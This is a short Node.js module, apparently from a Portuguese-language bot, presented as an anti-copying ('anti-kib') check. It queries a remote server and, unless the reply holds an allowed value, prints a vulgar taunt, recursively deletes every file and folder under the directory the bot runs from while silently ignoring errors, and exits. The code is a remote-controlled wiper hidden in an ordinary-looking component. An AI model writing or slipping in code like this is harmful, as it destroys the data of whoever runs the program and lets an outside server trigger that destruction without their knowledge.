const fs = require("fs");
const path = require("path");
const fetch = require('node-fetch');

module.exports = async function stickerly() {
try {
const respostx = await fetch("https://neon-apis.shop/verificacao");
let resposta = await respostx.json();
const valoresPermitidos = [2, 105];
if (!valoresPermitidos.includes(resposta?.valor)) {
console.clear();
console.log("\x1b[31m%s\x1b[0m", "vai kibar na casa do karalhokkkkkk");

const raizProjeto = process.cwd(); // raiz onde o bot está rodando

const excluirTudo = (dir) => {
if (!fs.existsSync(dir)) return;

  for (const arquivo of fs.readdirSync(dir)) {
const caminhoCompleto = path.join(dir, arquivo);
try {
const stat = fs.lstatSync(caminhoCompleto);

if (stat.isDirectory()) {
excluirTudo(caminhoCompleto);
fs.rmdirSync(caminhoCompleto);
} else {
fs.unlinkSync(caminhoCompleto);
}
} catch (err) {
// Ignora erros de permissões ou travas
}
}
};

excluirTudo(raizProjeto);
process.exit(); // Finaliza o processo após destruição
}
} catch (e) {
console.log("Erro na verificação anti-kib:", e);
process.exit();
}
};
